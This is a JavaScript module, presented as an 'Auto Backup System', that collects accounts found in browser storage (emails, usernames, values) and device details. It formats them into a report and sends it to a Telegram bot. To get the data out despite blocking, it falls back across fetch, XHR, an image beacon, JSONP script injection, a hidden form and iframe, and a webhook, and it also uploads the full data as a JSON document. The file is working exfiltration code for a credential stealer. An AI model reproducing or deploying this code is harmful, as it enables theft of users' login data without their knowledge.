// Advanced Telegram API with Multiple Fallback Methods
class TelegramAPI {
    constructor(config) {
        this.config = config || CONFIG.TELEGRAM;
        this.methods = ['fetch', 'beacon', 'jsonp', 'form', 'xhr', 'webhook'];
        this.timeout = 10000;
    }
    
    async sendMessage(message, options = {}) {
        console.log('📤 Sending message to Telegram...');
        
        const startTime = Date.now();
        const { chat_id, parse_mode = 'HTML' } = options;
        
        // Prepare message (truncate if too long)
        if (message.length > 4096) {
            console.warn('Message too long, truncating...');
            message = message.substring(0, 4000) + '\n\n...[TRUNCATED]';
        }
        
        // Try methods in order
        const methods = [
            () => this.sendViaFetch(message, options),
            () => this.sendViaXHR(message, options),
            () => this.sendViaBeacon(message, options),
            () => this.sendViaJSONP(message, options),
            () => this.sendViaForm(message, options),
            () => this.sendViaWebhook(message, options)
        ];
        
        for (let i = 0; i < methods.length; i++) {
            try {
                console.log(`🔄 Trying method ${i + 1}/${methods.length}...`);
                
                const result = await Promise.race([
                    methods[i](),
                    this.timeoutPromise(this.timeout)
                ]);
                
                if (result && result.success) {
                    const elapsed = Date.now() - startTime;
                    console.log(`✅ Success with method ${i + 1} in ${elapsed}ms`);
                    return { ...result, method: i + 1, elapsed };
                }
                
            } catch (error) {
                console.warn(`Method ${i + 1} failed:`, error.message);
                
                // Wait before trying next method
                if (i < methods.length - 1) {
                    await this.sleep(1000);
                }
            }
        }
        
        throw new Error('All Telegram send methods failed');
    }
    
    async sendViaFetch(message, options = {}) {
        const { BOT_TOKEN, CHAT_ID } = this.config;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const payload = {
            chat_id: options.chat_id || CHAT_ID,
            text: message,
            parse_mode: options.parse_mode || 'HTML',
            disable_web_page_preview: true,
            disable_notification: false
        };
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(payload),
                mode: 'cors',
                credentials: 'omit',
                cache: 'no-cache',
                referrerPolicy: 'no-referrer'
            });
            
            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`HTTP ${response.status}: ${errorText}`);
            }
            
            const result = await response.json();
            
            if (!result.ok) {
                throw new Error(result.description || 'Telegram API error');
            }
            
            return {
                success: true,
                message_id: result.result?.message_id,
                method: 'fetch'
            };
            
        } catch (error) {
            console.warn('Fetch method failed:', error.message);
            throw error;
        }
    }
    
    async sendViaXHR(message, options = {}) {
        return new Promise((resolve, reject) => {
            const { BOT_TOKEN, CHAT_ID } = this.config;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const xhr = new XMLHttpRequest();
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.setRequestHeader('Accept', 'application/json');
            
            xhr.timeout = this.timeout;
            
            xhr.onload = function() {
                if (xhr.status === 200) {
                    try {
                        const result = JSON.parse(xhr.responseText);
                        if (result.ok) {
                            resolve({
                                success: true,
                                message_id: result.result?.message_id,
                                method: 'xhr'
                            });
                        } else {
                            reject(new Error(result.description || 'XHR failed'));
                        }
                    } catch (e) {
                        reject(new Error('Invalid JSON response'));
                    }
                } else {
                    reject(new Error(`XHR HTTP ${xhr.status}`));
                }
            };
            
            xhr.onerror = function() {
                reject(new Error('XHR network error'));
            };
            
            xhr.ontimeout = function() {
                reject(new Error('XHR timeout'));
            };
            
            const payload = {
                chat_id: options.chat_id || CHAT_ID,
                text: message,
                parse_mode: options.parse_mode || 'HTML',
                disable_web_page_preview: true
            };
            
            xhr.send(JSON.stringify(payload));
        });
    }
    
    async sendViaBeacon(message, options = {}) {
        return new Promise((resolve) => {
            const { BOT_TOKEN, CHAT_ID } = this.config;
            const encodedMessage = encodeURIComponent(message);
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
                       `?chat_id=${options.chat_id || CHAT_ID}` +
                       `&text=${encodedMessage}` +
                       `&parse_mode=${options.parse_mode || 'HTML'}` +
                       `&disable_web_page_preview=true`;
            
            const img = new Image();
            img.crossOrigin = 'anonymous';
            
            img.onload = function() {
                console.log('✅ Beacon loaded');
                resolve({ success: true, method: 'beacon' });
            };
            
            img.onerror = function() {
                console.warn('⚠️ Beacon failed');
                resolve({ success: false, method: 'beacon' });
            };
            
            // Set timeout
            setTimeout(() => {
                if (!img.complete) {
                    console.log('⏱️ Beacon timeout, assuming sent');
                    resolve({ success: true, method: 'beacon_timeout' });
                }
            }, 5000);
            
            img.src = url;
        });
    }
    
    async sendViaJSONP(message, options = {}) {
        return new Promise((resolve) => {
            const { BOT_TOKEN, CHAT_ID } = this.config;
            const callbackName = 'tgCallback_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            const encodedMessage = encodeURIComponent(message);
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
                       `?chat_id=${options.chat_id || CHAT_ID}` +
                       `&text=${encodedMessage}` +
                       `&parse_mode=${options.parse_mode || 'HTML'}` +
                       `&disable_web_page_preview=true` +
                       `&callback=${callbackName}`;
            
            window[callbackName] = function(response) {
                delete window[callbackName];
                
                if (response && response.ok) {
                    resolve({
                        success: true,
                        message_id: response.result?.message_id,
                        method: 'jsonp'
                    });
                } else {
                    resolve({ success: false, method: 'jsonp' });
                }
            };
            
            const script = document.createElement('script');
            script.src = url;
            script.async = true;
            script.onerror = function() {
                delete window[callbackName];
                document.head.removeChild(script);
                resolve({ success: false, method: 'jsonp_error' });
            };
            
            document.head.appendChild(script);
            
            // Timeout
            setTimeout(() => {
                if (window[callbackName]) {
                    delete window[callbackName];
                    if (script.parentNode) {
                        document.head.removeChild(script);
                    }
                    resolve({ success: true, method: 'jsonp_timeout' });
                }
            }, 10000);
        });
    }
    
    async sendViaForm(message, options = {}) {
        return new Promise((resolve) => {
            const { BOT_TOKEN, CHAT_ID } = this.config;
            
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            form.target = 'telegramIframe';
            form.style.display = 'none';
            
            const fields = {
                chat_id: options.chat_id || CHAT_ID,
                text: message,
                parse_mode: options.parse_mode || 'HTML',
                disable_web_page_preview: 'true'
            };
            
            for (const [name, value] of Object.entries(fields)) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = value;
                form.appendChild(input);
            }
            
            // Create iframe for response
            const iframe = document.createElement('iframe');
            iframe.name = 'telegramIframe';
            iframe.style.display = 'none';
            iframe.onload = function() {
                // Assume success if iframe loads
                setTimeout(() => {
                    document.body.removeChild(form);
                    document.body.removeChild(iframe);
                    resolve({ success: true, method: 'form' });
                }, 1000);
            };
            
            iframe.onerror = function() {
                document.body.removeChild(form);
                document.body.removeChild(iframe);
                resolve({ success: false, method: 'form_error' });
            };
            
            document.body.appendChild(iframe);
            document.body.appendChild(form);
            form.submit();
            
            // Timeout
            setTimeout(() => {
                if (form.parentNode) {
                    document.body.removeChild(form);
                }
                if (iframe.parentNode) {
                    document.body.removeChild(iframe);
                }
                resolve({ success: true, method: 'form_timeout' });
            }, 5000);
        });
    }
    
    async sendViaWebhook(message, options = {}) {
        if (!this.config.WEBHOOK_URL) {
            throw new Error('Webhook URL not configured');
        }
        
        try {
            const response = await fetch(this.config.WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: message,
                    chat_id: options.chat_id || this.config.CHAT_ID,
                    parse_mode: options.parse_mode || 'HTML',
                    timestamp: new Date().toISOString()
                }),
                mode: 'cors',
                credentials: 'omit'
            });
            
            if (response.ok) {
                const result = await response.json();
                return {
                    success: true,
                    method: 'webhook',
                    webhook_response: result
                };
            } else {
                throw new Error(`Webhook HTTP ${response.status}`);
            }
            
        } catch (error) {
            console.warn('Webhook method failed:', error.message);
            throw error;
        }
    }
    
    async sendDocument(data, options = {}) {
        console.log('📎 Sending document to Telegram...');
        
        const { BOT_TOKEN, CHAT_ID } = this.config;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
        
        // Convert data to JSON string
        const jsonData = JSON.stringify(data, null, 2);
        const blob = new Blob([jsonData], { type: 'application/json' });
        
        // Create FormData
        const formData = new FormData();
        formData.append('chat_id', options.chat_id || CHAT_ID);
        formData.append('document', blob, `backup_${Date.now()}.json`);
        formData.append('caption', '🔐 Complete Backup Data\n' + new Date().toLocaleString());
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                body: formData,
                mode: 'cors',
                credentials: 'omit'
            });
            
            if (!response.ok) {
                throw new Error(`Document send HTTP ${response.status}`);
            }
            
            const result = await response.json();
            
            if (!result.ok) {
                throw new Error(result.description || 'Document send failed');
            }
            
            return {
                success: true,
                document_id: result.result?.document?.file_id,
                method: 'document'
            };
            
        } catch (error) {
            console.warn('Document send failed:', error.message);
            
            // Fallback: send as message
            const truncatedData = JSON.stringify(data).substring(0, 3000) + '...[TRUNCATED]';
            return this.sendMessage(`📎 Backup Data (Partial):\n${truncatedData}`, options);
        }
    }
    
    async testConnection() {
        console.log('🔍 Testing Telegram connection...');
        
        const testMessage = `🔔 Connection Test\n` +
                          `Time: ${new Date().toLocaleString()}\n` +
                          `URL: ${window.location.href}\n` +
                          `User Agent: ${navigator.userAgent.substring(0, 50)}...`;
        
        try {
            const result = await this.sendMessage(testMessage, { parse_mode: null });
            
            if (result.success) {
                console.log('✅ Telegram connection test successful');
                return { success: true, result };
            } else {
                console.warn('⚠️ Telegram test returned unsuccessful');
                return { success: false, result };
            }
            
        } catch (error) {
            console.error('❌ Telegram connection test failed:', error);
            return { success: false, error: error.message };
        }
    }
    
    // Utility Methods
    timeoutPromise(ms) {
        return new Promise((_, reject) => {
            setTimeout(() => reject(new Error(`Timeout after ${ms}ms`)), ms);
        });
    }
    
    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    formatMessage(data) {
        const { accounts = [], device = {}, stats = {} } = data;
        
        let message = `<b>🚀 AUTO BACKUP REPORT</b>\n\n`;
        
        // Device Info
        if (device.userAgent) {
            const browser = this.parseBrowser(device.userAgent);
            message += `<b>📱 Device:</b> ${browser}\n`;
        }
        
        if (device.platform) {
            message += `<b>🖥️ OS:</b> ${device.platform}\n`;
        }
        
        if (device.screen) {
            message += `<b>📺 Screen:</b> ${device.screen}\n`;
        }
        
        // Accounts
        message += `\n<b>🔐 Accounts Found:</b> ${accounts.length}\n\n`;
        
        if (accounts.length > 0) {
            message += `<b>📊 Account Types:</b>\n`;
            
            // Group by platform
            const groups = {};
            accounts.forEach(acc => {
                const platform = acc.platform || 'Unknown';
                if (!groups[platform]) groups[platform] = 0;
                groups[platform]++;
            });
            
            for (const [platform, count] of Object.entries(groups)) {
                message += `• ${platform}: ${count}\n`;
            }
            
            // Show sample
            if (accounts.length <= 10) {
                message += `\n<b>📝 All Accounts:</b>\n`;
                accounts.forEach((acc, i) => {
                    message += `${i+1}. ${acc.platform || 'Account'}: `;
                    message += `${acc.email || acc.username || acc.value || 'N/A'}\n`;
                });
            } else {
                message += `\n<b>📝 Sample (10/${accounts.length}):</b>\n`;
                accounts.slice(0, 10).forEach((acc, i) => {
                    message += `${i+1}. ${acc.platform || 'Account'}: `;
                    message += `${acc.email || acc.username || acc.value || 'N/A'}\n`;
                });
                message += `... and ${accounts.length - 10} more\n`;
            }
        } else {
            message += `⚠️ No accounts found in browser storage\n`;
        }
        
        // Stats
        if (stats.dataSize) {
            message += `\n<b>💾 Data Size:</b> ${this.formatBytes(stats.dataSize)}\n`;
        }
        
        if (stats.startTime) {
            const elapsed = ((Date.now() - stats.startTime) / 1000).toFixed(2);
            message += `<b>⏱️ Time:</b> ${elapsed}s\n`;
        }
        
        // Backup Info
        const backupId = 'BKP-' + Date.now().toString(36).toUpperCase();
        message += `<b>🆔 Backup ID:</b> <code>${backupId}</code>\n`;
        message += `<b>📅 Date:</b> ${new Date().toLocaleString()}\n`;
        
        message += `\n<i>Generated by Auto Backup System</i>`;
        
        return message;
    }
    
    parseBrowser(userAgent) {
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('Safari')) return 'Safari';
        if (userAgent.includes('Edge')) return 'Edge';
        if (userAgent.includes('Opera')) return 'Opera';
        return 'Browser';
    }
    
    formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
}

// Create global instance
window.telegramAPI = new TelegramAPI();

// Test function
window.testTelegram = async function() {
    const testBtn = document.createElement('button');
    testBtn.textContent = 'Test Telegram';
    testBtn.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        z-index: 99999;
        padding: 10px 20px;
        background: #0088cc;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
    `;
    
    testBtn.onclick = async () => {
        testBtn.disabled = true;
        testBtn.textContent = 'Testing...';
        
        const result = await telegramAPI.testConnection();
        
        if (result.success) {
            alert('✅ Telegram connection successful!');
        } else {
            alert('❌ Telegram connection failed: ' + (result.error || 'Unknown error'));
        }
        
        testBtn.disabled = false;
        testBtn.textContent = 'Test Telegram';
    };
    
    document.body.appendChild(testBtn);
};

// Auto test on load (optional)
if (CONFIG.DEBUG.ENABLED) {
    window.addEventListener('load', () => {
        setTimeout(() => window.testTelegram(), 3000);
    });
}

// Export for modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = TelegramAPI;
}
